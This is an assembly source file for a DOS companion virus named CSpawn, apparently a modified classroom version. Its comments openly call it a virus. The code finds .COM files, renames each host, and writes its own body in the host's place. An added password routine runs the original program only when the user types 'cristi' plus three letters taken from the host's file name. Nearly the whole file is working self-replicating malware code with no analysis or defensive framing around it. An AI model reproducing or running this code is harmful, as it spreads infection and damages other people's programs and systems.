.model tiny
.code
        org 100h
CSpawn:
        MOV SP, offset FINISH + 100h
        MOV AH, 4AH
        MOV BX,SP
        MOV CL,4
        SHR BX,CL
        INC BX
        INT 21H

        MOV BX,2Ch
        MOV AX,[BX]
        MOV WORD PTR [PARAM_BLK],AX
        MOV AX,CS
        MOV WORD PTR [PARAM_BLK+4],AX
        MOV WORD PTR [PARAM_BLK+8],AX
        MOV WORD PTR [PARAM_BLK+12],AX
       

        CLI
	mov     bx,ax                   
        mov     ax,cs                   
        mov     ss,ax                  
        mov     sp,(FINISH - CSpawn) + 200H
        sti                
	push    bx                
	mov     ds,ax                 
        mov     es,ax                  
        mov     ah,1AH               
        mov     dx,80H                   
        int     21H   
    ;prepare the procedure call by pushing return value
	; and real name
	mov ax,offset Verification
	push ax
	mov ax,offset REAL_NAME
	push ax
	call Check_Password	
	;after the call we compare the return,
	; if the password is good we exit, else we run the virus again
	mov al,01
	cmp al,Verification
	je Final
	;virus infectation
	call    FIND_FILES 
        pop     ax		
	Final:	
    mov     ax,4C00H                    
	int 21h                  


FIND_FILES:                
	mov     dx,OFFSET COM_MASK      
        mov     ah,4EH                  
        xor     cx,cx              
FIND_LOOP:      
	int     21H                
	jc      FIND_DONE              
        call    INFECT_FILE            
        mov     ah,4FH                  
        jmp     FIND_LOOP              
FIND_DONE:      ret                  
        COM_MASK        db      '*.COM',0            


INFECT_FILE:                
	mov     si,9EH                             
	mov     di,OFFSET REAL_NAME     
INF_LOOP:       
	lodsb                           
	stosb                           
	or      al,al                   
	jnz     INF_LOOP                
        mov     WORD PTR [di-2],'N'   
	mov     dx,9EH                  
	mov     di,OFFSET REAL_NAME                
	mov     ah,56H                 
	int     21H
	jc      INF_EXIT                

	mov     ah,3CH                  
        mov     cx,2                   
        int     21H
        mov     bx,ax                   
        mov     ah,40H                  
        mov     cx,FINISH - CSpawn      
        mov     dx,OFFSET CSpawn        
        int     21H                
	mov     ah,3EH                  
        int     21H
INF_EXIT:       ret
	REAL_NAME       db      13 dup (?)             
	Verification db 0
	;DOS EXEC function parameter block
        PARAM_BLK       DW      ?                       
                	DD      80H                   
	                DD      5CH                    
        	        DD      6CH                     
	target_string db 'cristixxx', 0
    input_buffer  db 20 dup(10)
	message db 'Enter Password', 0Dh, 0Ah, '$'  ;
	; variables needed 
Check_Password proc near
	push BP
    mov BP, SP 
	
	;print the message
	mov ah, 09h   
    lea dx, message                 
    int 21h 
	
	;create the expected password (cristi+first 3 letters of program)
	mov cx, 3       
	mov si, ss:[bp+4]     
	lea di, target_string+6
	CopyLoop:
    lodsb                    
    stosb                    
    loop CopyLoop      
	
	; Get input from user
        lea dx, input_buffer
        mov ah, 0Ah
        int 21h
	; when we enter the input we get 0Dh at the end (enter)
	; we want to replace it with string end 00h
        lea si, input_buffer + 2
		xor ax, ax
        mov al, [input_buffer + 1]
        add si, ax
        mov byte ptr [si], 0

        ; Compare input with target string
        lea si, input_buffer + 2
        lea di, target_string
	
	CompareLoop:
    lodsb                            ; Load a byte from input (SI) into AL
    scasb                            ; Compare AL with byte at DI
    jnz Exit                      
    or al, al                        ; Check if AL is the null terminator
    jnz CompareLoop                  ; If not, continue looping

    ; If we exit the loop, the strings matched so we run the exec
	MOV DX,ss:[bp+4]
    MOV BX,offset PARAM_BLK
    MOV AX,4B00h
    INT 21h
	; set return value to 1
	mov bx,ss:[bp+6]
	mov ax,1
	mov ds:[bx],ax
	;exit and clear stack
Exit:
	pop bp
    ret 4
Check_Password endp
FINISH:
	end     CSpawn

